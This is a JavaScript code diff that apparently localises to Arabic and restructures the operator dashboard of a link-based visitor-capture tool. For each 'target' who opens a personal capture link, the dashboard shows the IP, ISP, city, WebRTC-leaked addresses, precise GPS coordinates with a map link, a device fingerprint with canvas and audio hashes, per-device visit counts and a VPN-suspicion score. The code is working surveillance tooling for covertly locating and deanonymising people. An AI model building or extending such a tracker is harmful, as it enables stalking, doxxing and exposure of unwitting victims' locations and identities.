@@ -20,13 +20,21 @@ function cacheElements() {
     'searchInput',
     'layerFilter',
     'sortSelect',
-    'welcomeOverlay',
-    'activeCapturePanel',
-    'toastContainer',
+    'mapOverlay',
+    'detailEmpty',
+    'detailContent',
+    'detailId',
+    'detailDeviceBadge',
+    'detailTime',
+    'layerStatus',
+    'detailSections',
+    'toast',
     'liveBadge',
-    'personalLinkInput',
-    'refreshBtn',
-    'clearAllBtn'
+    'confirmBackdrop',
+    'confirmModal',
+    'confirmTitle',
+    'confirmText',
+    'personalLinkInput'
   ].forEach((id) => {
     ui[id] = document.getElementById(id);
   });
@@ -45,10 +53,9 @@ document.addEventListener('DOMContentLoaded', async () => {
 
 function initMap() {
   if (!window.L) {
-    if (ui.welcomeOverlay) {
-      ui.welcomeOverlay.querySelector('h2').textContent = 'تعذر تحميل الخريطة';
-      ui.welcomeOverlay.querySelector('p').textContent = 'لا يمكن الاتصال بمزود الخرائط حالياً، لكن إدارة العمليات ما زالت فعالة من القائمة الجانبية.';
-    }
+    ui.mapOverlay.classList.remove('hidden');
+    ui.mapOverlay.querySelector('strong').textContent = 'تعذر تحميل الخريطة';
+    ui.mapOverlay.querySelector('span').textContent = 'إدارة العمليات ما زالت فعالة من القائمة الجانبية.';
     return;
   }
 
@@ -70,10 +77,6 @@ function initMap() {
 }
 
 function bindEvents() {
-  // Map Action Buttons
-  if (ui.refreshBtn) ui.refreshBtn.onclick = () => loadCaptures({ force: true, fit: false, notify: true });
-  if (ui.clearAllBtn) ui.clearAllBtn.onclick = () => clearAll();
-
   document.addEventListener('click', async (event) => {
     const viewButton = event.target.closest('[data-view]');
     if (viewButton) {
@@ -82,20 +85,21 @@ function bindEvents() {
     }
 
     const action = event.target.closest('[data-action]')?.dataset.action;
-    if (!action) return;
+    if (action) {
+      if (action === 'export-json') exportJSON();
+      if (action === 'export-csv') exportCSV();
+      if (action === 'refresh') loadCaptures({ force: true, fit: false, notify: true });
+      if (action === 'clear-all') clearAll();
+      if (action === 'fit-map') fitMapToCaptures();
+      if (action === 'latest') selectLatest();
+      if (action === 'toggle-live') toggleLive();
+      if (action === 'delete-selected') deleteSelectedCapture();
+      if (action === 'copy-selected') copySelectedDetails();
+      if (action === 'cancel-confirm') resolveConfirm(false);
+      if (action === 'confirm-action') resolveConfirm(true);
+      return;
+    }
 
-    if (action === 'refresh') loadCaptures({ force: true, fit: false, notify: true });
-    if (action === 'clear-all') clearAll();
-    if (action === 'copy-selected') copySelectedDetails();
-    if (action === 'cancel-confirm') resolveConfirm(false);
-    if (action === 'confirm-action') resolveConfirm(true);
-  });
-
-  ui.searchInput.addEventListener('input', () => applyFiltersAndRender());
-  ui.layerFilter.addEventListener('change', () => applyFiltersAndRender());
-  ui.sortSelect.addEventListener('change', () => applyFiltersAndRender());
-
-  ui.listArea.addEventListener('click', (event) => {
     const deleteButton = event.target.closest('[data-delete-capture]');
     if (deleteButton) {
       event.stopPropagation();
@@ -131,6 +135,10 @@ function bindEvents() {
     event.preventDefault();
     actionable.click();
   });
+
+  ui.searchInput.addEventListener('input', () => applyFiltersAndRender());
+  ui.layerFilter.addEventListener('change', () => applyFiltersAndRender());
+  ui.sortSelect.addEventListener('change', () => applyFiltersAndRender());
 }
 
 async function fetchUserInfo() {
@@ -149,7 +157,7 @@ async function fetchUserInfo() {
 function copyPersonalLink() {
   const url = ui.personalLinkInput.value;
   if (!url || url.includes('...')) return;
-  copyText(url, 'Personal capture link copied.');
+  copyText(url, 'تم نسخ رابط الالتقاط بنجاح');
 }
 
 async function loadCaptures(options = {}) {
@@ -412,16 +420,14 @@ function renderMap(shouldFit = false) {
   }
 }
 
+
 function selectCapture(id) {
   selectedId = id;
   const capture = captures.find((item) => item.id === id);
   if (!capture) return;
-
-  if (ui.welcomeOverlay) ui.welcomeOverlay.classList.add('hidden');
   renderDetail(capture);
   renderList();
   renderMap(false);
-
   const loc = getCaptureLocation(capture);
   if (loc && map) {
     map.setView([loc.lat, loc.lon], loc.source === 'gps' ? 16 : 10, { animate: true });
@@ -430,145 +436,97 @@ function selectCapture(id) {
 
 function selectLatest() {
   const latest = filteredCaptures[0] || sortCaptures(captures)[0];
-  if (!latest) {
-    showToast('There is no capture to select.');
-    return;
-  }
+  if (!latest) { showToast('لا توجد عملية للعرض'); return; }
   selectCapture(latest.id);
 }
 
 function clearSelection() {
   selectedId = null;
-  if (ui.welcomeOverlay) ui.welcomeOverlay.classList.remove('hidden');
-  if (ui.activeCapturePanel) ui.activeCapturePanel.classList.add('hidden');
+  ui.detailEmpty.classList.remove('hidden');
+  ui.detailContent.classList.add('hidden');
   renderList();
   renderMap(false);
 }
 
 function renderDetail(capture) {
-  if (ui.welcomeOverlay) ui.welcomeOverlay.classList.add('hidden');
-  ui.activeCapturePanel.classList.remove('hidden');
-
-  const siblings = captures
-    .filter((item) => item.deviceId === capture.deviceId)
-    .sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
+  ui.detailEmpty.classList.add('hidden');
+  ui.detailContent.classList.remove('hidden');
+  const siblings = captures.filter((item) => item.deviceId === capture.deviceId).sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
   const visitIndex = Math.max(0, siblings.findIndex((item) => item.id === capture.id)) + 1;
-
-  ui.activeCapturePanel.innerHTML = `
-    <div class="capture-card-header">
-      <div class="capture-meta-top">
-        <span class="badge">عملية رقم: ${capture.id}</span>
-        <span class="time">${new Date(capture.timestamp).toLocaleString('ar-EG')}</span>
-      </div>
-      <h2>تفاصيل الهدف</h2>
-      <div class="device-tag">الزيارة ${visitIndex} من ${siblings.length} / ${shortId(capture.deviceId)}</div>
-    </div>
-    <div class="capture-grid-details">
-      <div class="detail-section">
-        <h3>بيانات الموقع والشبكة</h3>
-        <div class="info-row"><span>IP الحالي:</span> <strong>${capture.ip}</strong></div>
-        <div class="info-row"><span>المزود:</span> <strong>${capture.ipGeo?.isp || 'غير معروف'}</strong></div>
-        <div class="info-row"><span>المدينة:</span> <strong>${capture.ipGeo?.city || 'غير معروف'}</strong></div>
-        <div class="info-row"><span>الدولة:</span> <strong>${capture.ipGeo?.country || 'غير معروف'}</strong></div>
-        <div class="info-row"><span>دقة الموقع:</span> <strong class="${capture.gps ? 'ok' : 'warn'}">${capture.gps ? 'عالية (GPS)' : 'تقريبية (IP)'}</strong></div>
-      </div>
-      <div class="detail-section">
-        <h3>البصمة الرقمية</h3>
-        <div class="info-row"><span>نظام التشغيل:</span> <strong>${capture.platform || 'غير معروف'}</strong></div>
-        <div class="info-row"><span>اللغة:</span> <strong>${capture.language || 'غير معروف'}</strong></div>
-        <div class="info-row"><span>دقة الشاشة:</span> <strong>${capture.screenRes || 'غير معروف'}</strong></div>
-        <div class="info-row"><span>المعالج الرسومي:</span> <strong style="font-size:10px">${capture.gpu || 'غير معروف'}</strong></div>
-      </div>
-    </div>
-    <div class="action-footer">
-       <button class="icon-btn danger" onclick="deleteSelectedCapture()" title="حذف">
-         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/></svg>
-       </button>
-    </div>
+  ui.detailId.textContent = capture.id;
+  ui.detailDeviceBadge.textContent = `الزيارة ${visitIndex} من ${siblings.length} / ${shortId(capture.deviceId)}`;
+  ui.detailTime.textContent = new Date(capture.timestamp).toLocaleString('ar-EG');
+  ui.layerStatus.innerHTML = `
+    <span class="layer-chip ok"><i class="chip-dot"></i>تم التقاط IP</span>
+    <span class="layer-chip ${capture.webrtcIPs.length ? 'warn' : ''}"><i class="chip-dot"></i>WebRTC ${capture.webrtcIPs.length ? 'مكشوف' : 'محجوب'}</span>
+    <span class="layer-chip ${capture.gps ? 'ok' : ''}"><i class="chip-dot"></i>GPS ${capture.gps ? 'متاح' : 'غير متاح'}</span>
   `;
-}
+  const ipGeo = capture.ipGeo || {};
+  const fp = capture.fingerprint || {};
+  const loc = getCaptureLocation(capture);
+  const metadata = capture.metadata || {};
+  const rows = [];
+  rows.push(section('الموقع الجغرافي (IP)', iconGlobe(), [
+    row('عنوان IP', capture.ip), row('المدينة', ipGeo.city), row('المنطقة', ipGeo.region),
+    row('الدولة', ipGeo.country), row('المزود', ipGeo.isp),
+    row('الإحداثيات', hasIPLocation(capture) ? `${formatCoord(ipGeo.lat)}, ${formatCoord(ipGeo.lon)}` : null),
+  ]));
   if (metadata.regionalLatency) {
     const l = metadata.regionalLatency;
-    rows.push(section('Regional Latency Profile', iconGlobe(), [
-      row('Europe (Frankfurt)', l.EU_West ? `${l.EU_West}ms` : 'timeout'),
-      row('US (New York)', l.US_East ? `${l.US_East}ms` : 'timeout'),
-      row('Asia (Tokyo)', l.ASIA_East ? `${l.ASIA_East}ms` : 'timeout'),
-      row('Middle East (Dubai)', l.ME_South ? `${l.ME_South}ms` : 'timeout'),
+    rows.push(section('بصمة التأخير الإقليمي', iconGlobe(), [
+      row('أوروبا', l.EU_West ? `${l.EU_West}ms` : 'انتهت المهلة'),
+      row('أمريكا', l.US_East ? `${l.US_East}ms` : 'انتهت المهلة'),
+      row('آسيا', l.ASIA_East ? `${l.ASIA_East}ms` : 'انتهت المهلة'),
+      row('الشرق الأوسط', l.ME_South ? `${l.ME_South}ms` : 'انتهت المهلة'),
     ]));
   }
-
-  rows.push(section('WebRTC', iconUnlock(), capture.webrtcIPs.length
-    ? capture.webrtcIPs.map((ip, index) => row(`Candidate ${index + 1}`, ip, 'warn'))
-    : [rowEmpty('No WebRTC candidate was exposed by this browser')]
+  rows.push(section('تسريب WebRTC', iconUnlock(), capture.webrtcIPs.length
+    ? capture.webrtcIPs.map((ip, i) => row(`عنوان ${i + 1}`, ip, 'warn'))
+    : [rowEmpty('لم يتم كشف أي عنوان WebRTC')]
   ));
-
   if (capture.gps) {
-    rows.push(section('Browser GPS', iconPin(), [
-      row('Latitude', formatCoord(capture.gps.lat), 'good'),
-      row('Longitude', formatCoord(capture.gps.lon), 'good'),
-      row('Accuracy', `${Math.round(capture.gps.accuracy || 0)} meters`),
-      row('Altitude', capture.gps.altitude != null ? `${Number(capture.gps.altitude).toFixed(1)} m` : null),
-      row('Speed', capture.gps.speed != null ? `${Number(capture.gps.speed).toFixed(1)} m/s` : null),
-      row('Heading', capture.gps.heading != null ? `${Number(capture.gps.heading).toFixed(1)} deg` : null),
-      rowLink('Maps', `https://maps.google.com/?q=${capture.gps.lat},${capture.gps.lon}`, 'Open Google Maps'),
+    rows.push(section('موقع GPS الدقيق', iconPin(), [
+      row('خط العرض', formatCoord(capture.gps.lat), 'good'),
+      row('خط الطول', formatCoord(capture.gps.lon), 'good'),
+      row('الدقة', `${Math.round(capture.gps.accuracy || 0)} متر`),
+      row('الارتفاع', capture.gps.altitude != null ? `${Number(capture.gps.altitude).toFixed(1)} م` : null),
+      rowLink('الخريطة', `https://maps.google.com/?q=${capture.gps.lat},${capture.gps.lon}`, 'فتح خرائط جوجل'),
     ]));
   } else {
-    rows.push(section('Browser GPS', iconPin(), [rowEmpty('Location permission was denied, skipped, or unavailable')]));
+    rows.push(section('موقع GPS', iconPin(), [rowEmpty('لم يتم منح إذن الموقع')]));
   }
-
-  rows.push(section('Device fingerprint', iconMonitor(), [
-    row('Device type', parseDevice(fp.userAgent).name),
-    row('User agent', fp.userAgent),
-    row('Platform', fp.platform),
-    row('Language', fp.language),
-    row('Screen', fp.screenRes),
-    row('Timezone', fp.timezone),
-    row('CPU cores', fp.cores || null),
-    row('Memory', fp.memory ? `${fp.memory} GB` : null),
-    row('GPU', fp.gpu),
-    row('Touch', fp.touchSupport ? 'Yes' : 'No'),
-    row('Connection', fp.connectionType),
+  rows.push(section('البصمة الرقمية', iconMonitor(), [
+    row('نوع الجهاز', parseDevice(fp.userAgent).name), row('المنصة', fp.platform),
+    row('اللغة', fp.language), row('الشاشة', fp.screenRes), row('المنطقة الزمنية', fp.timezone),
+    row('أنوية المعالج', fp.cores || null), row('الذاكرة', fp.memory ? `${fp.memory} GB` : null),
+    row('المعالج الرسومي', fp.gpu), row('شاشة لمس', fp.touchSupport ? 'نعم' : 'لا'),
+    row('نوع الاتصال', fp.connectionType),
   ]));
-
-  const deviceTz = fp.timezone;
-  const ipTz = ipGeo.timezone;
-  
-  let vpnSus = false;
-  let vpnReason = [];
+  const deviceTz = fp.timezone; const ipTz = ipGeo.timezone;
+  let vpnSus = false; let vpnReason = [];
   if (deviceTz && ipTz && deviceTz !== '-' && ipTz !== '-' && deviceTz !== ipTz) {
-    vpnSus = true;
-    vpnReason.push(`Timezone mismatch (Device: ${deviceTz} vs IP: ${ipTz})`);
+    vpnSus = true; vpnReason.push(`تناقض المنطقة الزمنية (${deviceTz} مقابل ${ipTz})`);
   }
-
   let trustScore = 100;
   if (vpnSus) trustScore -= 40;
   if (!capture.webrtcIPs || capture.webrtcIPs.length === 0) trustScore -= 20;
   if (!capture.gps) trustScore -= 20;
   if (!fp.canvas) trustScore -= 10;
-  if (fp.userAgent && fp.userAgent.includes('Headless')) trustScore -= 30;
-
   trustScore = Math.max(0, trustScore);
-
-  let trustColor = 'good';
-  if (trustScore < 50) trustColor = 'warn'; 
-  else if (trustScore < 80) trustColor = 'warn';
-
-  rows.push(section('Advanced Tracking & Anonymity', iconMonitor(), [
-    row('Anonymity Trust Score', `${trustScore}%`, trustColor),
-    row('VPN / Proxy Risk', vpnSus ? 'High Suspicion' : 'Low', vpnSus ? 'warn' : 'good'),
-    ...(vpnSus ? [row('Suspicion Reason', vpnReason.join(', '))] : []),
-    row('Canvas Hash', fp.canvas ? `${fp.canvas.slice(0, 20)}...` : '-'),
-    row('Audio Hash', fp.audioFingerprint || '-'),
+  rows.push(section('تحليل إخفاء الهوية', iconMonitor(), [
+    row('درجة الموثوقية', `${trustScore}%`, trustScore >= 80 ? 'good' : 'warn'),
+    row('خطر VPN', vpnSus ? 'اشتباه عالٍ' : 'منخفض', vpnSus ? 'warn' : 'good'),
+    ...(vpnSus ? [row('السبب', vpnReason.join(', '))] : []),
+    row('بصمة Canvas', fp.canvas ? `${fp.canvas.slice(0, 20)}...` : '—'),
+    row('بصمة الصوت', fp.audioFingerprint || '—'),
   ]));
-
-  rows.push(section('Actions', iconClipboard(), [
-    loc ? rowLink('Coordinates', `https://maps.google.com/?q=${loc.lat},${loc.lon}`, 'Open selected point') : rowEmpty('No map coordinates available for this capture'),
-    row('Device ID', capture.deviceId),
-    row('Visit count', capture.visitCount),
+  rows.push(section('إجراءات', iconClipboard(), [
+    loc ? rowLink('الإحداثيات', `https://maps.google.com/?q=${loc.lat},${loc.lon}`, 'فتح في الخريطة') : rowEmpty('لا توجد إحداثيات'),
+    row('معرف الجهاز', capture.deviceId), row('عدد الزيارات', capture.visitCount),
   ]));
-
   ui.detailSections.innerHTML = rows.join('');
 }
+
 
 function section(title, icon, rows) {
   return `
@@ -735,12 +693,9 @@ function copySelectedDetails() {
 
 function toggleLive() {
   liveRefresh = !liveRefresh;
-  ui.liveBadge.textContent = liveRefresh ? 'Live' : 'Paused';
+  ui.liveBadge.textContent = liveRefresh ? 'مباشر' : 'متوقف';
   ui.liveBadge.classList.toggle('paused', !liveRefresh);
-  ui.liveToggle.innerHTML = liveRefresh
-    ? `${iconPause()} Pause`
-    : `${iconPlay()} Resume`;
-  showToast(liveRefresh ? 'Live refresh resumed.' : 'Live refresh paused.');
+  showToast(liveRefresh ? 'تم استئناف البث المباشر' : 'تم إيقاف البث المباشر');
 }
 
 function fitMapToCaptures() {
@@ -851,26 +806,13 @@ async function copyText(text, successMessage) {
   }
 }
 
-function showToast(msg, type = 'info') {
-  if (!ui.toastContainer) return;
-  const t = document.createElement('div');
-  t.className = `toast ${type}`;
-  t.textContent = msg;
-  ui.toastContainer.appendChild(t);
-  setTimeout(() => t.classList.add('reveal'), 10);
-  setTimeout(() => {
-    t.classList.remove('reveal');
-    setTimeout(() => t.remove(), 400);
-  }, 3500);
+function showToast(message) {
+  if (!ui.toast) return;
+  ui.toast.textContent = message;
+  ui.toast.className = 'toast show';
+  clearTimeout(showToast.timer);
+  showToast.timer = setTimeout(() => ui.toast.className = 'toast', 3000);
 }
-
-window.copyPersonalLink = () => {
-  const input = ui.personalLinkInput;
-  if (!input || input.value.includes('...')) return;
-  input.select();
-  document.execCommand('copy');
-  showToast('تم نسخ رابط الالتقاط بنجاح', 'success');
-};
 
 function escapeHTML(value) {
   const span = document.createElement('span');
